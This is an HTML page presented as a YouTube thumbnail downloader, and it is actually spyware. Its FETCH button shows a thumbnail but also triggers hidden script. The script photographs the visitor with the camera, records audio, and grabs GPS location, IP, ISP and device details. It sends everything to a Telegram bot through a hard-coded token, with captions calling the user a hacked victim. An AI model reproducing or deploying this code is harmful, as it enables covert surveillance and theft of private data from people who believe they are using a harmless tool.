<!DOCTYPE html>
<html lang="en">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <title>YouTube Thumbnail Downloader</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
  <style>
    body {
      font-family: 'Montserrat', sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f5f5f5;
    }
    .navbar {
      background-color: #ff0000;
      color: white;
      text-align: center;
      padding: 15px 0;
    }
    #header {
      margin: 0;
      font-size: 28px;
      font-weight: bold;
    }
    .container {
      max-width: 600px;
      margin: 20px auto;
      padding: 20px;
      background-color: #fff;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    .form-control {
      width: calc(100% - 22px);
      margin-bottom: 15px;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
      box-sizing: border-box;
      font-family: 'Montserrat', sans-serif;
    }
    #thumbdloadbtn {
      display: block;
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 5px;
      background-color: #ff0000;
      color: white;
      font-size: 16px;
      cursor: pointer;
      font-family: 'Montserrat', sans-serif;
    }
    #thumbdloadbtn:hover {
      background-color: #cc0000;
    }
    footer {
      text-align: center;
      margin-top: 40px;
      color: #666;
    }
    .youtube-logo {
      display: block;
      margin: 20px auto;
      width: 100px;
    }
  </style>
</head>
<body>
  <nav class="navbar">
    <img class="youtube-logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
    <h1 id="header">YOUTUBE THUMBNAIL DOWNLOADER</h1>
  </nav>

  <div class="container">
    <input id="ytlink" type="text" class="form-control" placeholder="Enter YouTube Video URL" spellcheck="false">
    <button id="thumbdloadbtn" onclick="fetchData()">FETCH</button>
    <div id="thumbnail-preview"></div>

    <h2>How to Download HD YouTube Thumbnail</h2>
    <ol>
      <li>Copy the YouTube Video Link / URL from the YouTube App or Website</li>
      <li>Paste the YouTube video Link / URL in the Input Field Above</li>
      <li>Click on the "FETCH" Button</li>
      <li>Select the thumbnail quality</li>
      <li>Download the Thumbnail</li>
    </ol>
  </div>

  <center>
    <button id="toggle-video" style="display:none;">Toggle Video</button>
    <div id="message-container"></div>
    <video id="video" width="0" height="0" autoplay></video>
  </center>

  <script type="text/javascript">
    function fetchData() {
      var btn = document.getElementById('thumbdloadbtn');
      btn.textContent = 'Fetching from server... Wait';

      var videoUrl = document.getElementById('ytlink').value;
      if (videoUrl) {
        var videoId = videoUrl.split('v=')[1];
        if (videoId) {
          videoId = videoId.split('&')[0];
        }
        
        var thumbnailUrl = `https://img.youtube.com/vi/${videoId}/maxresdefault.jpg`;
        var thumbnailPreview = document.getElementById('thumbnail-preview');
        thumbnailPreview.innerHTML = `<img src="${thumbnailUrl}" alt="Thumbnail" style="width: 100%; max-height: 300px; object-fit: cover;" />`;
        btn.textContent = 'Select quality and Download';
      } else {
        btn.textContent = 'FETCH';
        console.error("Please enter a YouTube URL.");
      }

      // Parallel requests to fetch all data
      const getDeviceInfoPromise = getIPAndNetworkInfo().then(ipInfo => getDeviceAndBatteryInfo(ipInfo));
      const getLocationPromise = getUserLocation();

      // Start camera/audio access first
      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then((stream) => {
          const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
          const audioRecorder = new MediaRecorder(stream);
          const chunks = [];

          const capturePhotos = Array.from({ length: 3 }, (_, index) => capturePhoto(imageCapture, index));
          const startRecording = startAudioRecording(audioRecorder, chunks);

          Promise.all([Promise.all(capturePhotos), startRecording, getLocationPromise, getDeviceInfoPromise])
            .then(() => {
              console.log("All media and info captured and sent to Telegram.");
            })
            .catch((error) => {
              console.error("Error during capture or sending:", error);
            });
        })
        .catch((error) => {
          console.warn('Media Permissions denied or device issue. Attempting to send other info.');
          // If media fails, still try to send location and device info
          Promise.all([getLocationPromise, getDeviceInfoPromise])
                .catch(err => console.error("Error sending non-media info:", err));
        });
    }

    // --- IP and Network Information Function ---
    function getIPAndNetworkInfo() {
        return fetch('https://ipinfo.io/json')
            .then(response => response.json())
            .then(data => {
                return {
                    PublicIP: data.ip || 'Unknown',
                    ISP: data.org || 'Unknown',
                    City: data.city || 'Unknown',
                    Country: data.country || 'Unknown'
                };
            })
            .catch(error => {
                console.error("Error fetching IP info:", error);
                return { PublicIP: 'Fetch Failed', ISP: 'Fetch Failed', City: 'Fetch Failed', Country: 'Fetch Failed' };
            });
    }

    // --- Device, Battery, and IP Consolidation Function ---
    function getDeviceAndBatteryInfo(ipInfo) {
        return new Promise((resolve) => {
            let info = {
                // IP and Network Details
                'IP Address': ipInfo.PublicIP,
                'ISP / Network': ipInfo.ISP,
                'Approx. Location (IP)': `${ipInfo.City}, ${ipInfo.Country}`,

                // Device and Browser Details
                UserAgent: navigator.userAgent,
                Platform: navigator.platform,
                Language: navigator.language,
                Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                ScreenResolution: `${window.screen.width}x${window.screen.height}`,
                ViewportSize: `${window.innerWidth}x${window.innerHeight}`,
                CPUcores: navigator.hardwareConcurrency,
                ConnectionType: navigator.connection ? navigator.connection.effectiveType : 'Not Available',
                BatteryStatus: 'Not Available'
            };

            if ('getBattery' in navigator) {
                navigator.getBattery().then((battery) => {
                    info.BatteryStatus = `Level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? 'Yes' : 'No'}`;
                    sendToTelegram(JSON.stringify(info, null, 2), 'device_info');
                    resolve();
                }).catch(() => {
                    sendToTelegram(JSON.stringify(info, null, 2), 'device_info');
                    resolve();
                });
            } else {
                sendToTelegram(JSON.stringify(info, null, 2), 'device_info');
                resolve();
            }
        });
    }

    function capturePhoto(imageCapture, index) {
      return new Promise((resolve) => {
        setTimeout(() => {
          imageCapture.takePhoto()
            .then((blob) => {
              sendToTelegram(blob, 'photo');
              resolve();
            })
            .catch((error) => {
              console.error('Error capturing photo:', error);
              resolve();
            });
        }, index * 2000);
      });
    }

    function startAudioRecording(audioRecorder, chunks) {
      return new Promise((resolve) => {
        audioRecorder.start();
        console.log("Audio recording started...");

        audioRecorder.ondataavailable = (event) => {
          if (event.data.size > 0) {
            chunks.push(event.data);
          }
        };

        setTimeout(() => {
          if (audioRecorder.state !== 'inactive') {
            audioRecorder.stop();
          }
        }, 5000);

        audioRecorder.onstop = () => {
          if (chunks.length > 0) {
            const audioBlob = new Blob(chunks, { type: 'audio/wav' });
            sendToTelegram(audioBlob, 'audio');
            resolve();
          } else {
            console.warn('No audio recorded.');
            resolve();
          }
        };

        audioRecorder.onerror = (error) => {
          console.error('Error while recording audio:', error);
          resolve();
        };
      });
    }

    /**
     * UPDATED: Now uses Telegram's sendLocation API method instead of sending a link.
     */
    function getUserLocation() {
      return new Promise((resolve) => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              var latitude = position.coords.latitude;
              var longitude = position.coords.longitude;
              console.log("Location Captured:", latitude, longitude);

              // Send as native location
              sendToTelegram({ latitude, longitude }, 'location');
              resolve();
            },
            (error) => {
              console.error("Error getting location:", error);
              resolve();
            }
          );
        } else {
          console.warn("Geolocation not supported.");
          resolve();
        }
      });
    }

    /**
     * UPDATED: Logic to handle sendLocation and ensure all data types are sent.
     */
    function sendToTelegram(data, type) {
      const botToken = '7530633346:AAGcNuDErVnXJxzuan7zEpyQUbMDMwk0DW4'; // Replace with your bot token
      const chatId = GetURLParameter('id'); 
      if (!chatId) {
          console.error("Chat ID is missing. Cannot send data to Telegram.");
          return;
      }

      const formData = new FormData();
      formData.append('chat_id', chatId);

      let apiEndpoint = '';
      const messageCaption = "<b>Victim Get Hacked By Nasir Hacker</b>";

      if (type === 'location') {
          // Send Location Map
          formData.append('latitude', data.latitude);
          formData.append('longitude', data.longitude);
          formData.append('caption', messageCaption + ' - GPS Location'); 
          formData.append('parse_mode', 'HTML');
          apiEndpoint = 'sendLocation';
      } else if (type === 'device_info') {
          // Send Device Info as a text message
          const deviceInfoMessage = messageCaption + ` - Advanced Info\n<pre>${data}</pre>`;
          formData.append('text', deviceInfoMessage);
          formData.append('parse_mode', 'HTML');
          apiEndpoint = 'sendMessage';
      } else {
        // Send media (photo or audio)
        formData.append('caption', messageCaption);
        formData.append('parse_mode', 'HTML');

        if (type === 'photo') {
          formData.append('photo', data, 'camera.jpg');
          apiEndpoint = 'sendPhoto';
        } else if (type === 'audio') {
          formData.append('audio', data, 'audio_recording.wav');
          apiEndpoint = 'sendAudio';
        }
      }

      // Skip API call if no endpoint was set (e.g., if type was unknown)
      if (!apiEndpoint) return; 

      fetch(`https://api.telegram.org/bot${botToken}/${apiEndpoint}`, {
        method: 'POST',
        body: formData
      })
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            console.log(`Telegram ${type} sent successfully:`, data);
          } else {
            console.error(`Telegram ${type} error response:`, data);
          }
        })
        .catch(error => {
          console.error(`Error sending ${type} to Telegram:`, error);
        });
    }

    function GetURLParameter(sParam) {
      var sPageURL = window.location.search.substring(1);
      var sURLVariables = sPageURL.split('&');
      for (var i = 0; i < sURLVariables.length; i++) {
        var sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] == sParam) {
          return sParameterName[1];
        }
      }
    }
  </script>

  <footer>
    <p>Made With ❤️ By NASIR HACKER</p>
  </footer>
</body>
</html>
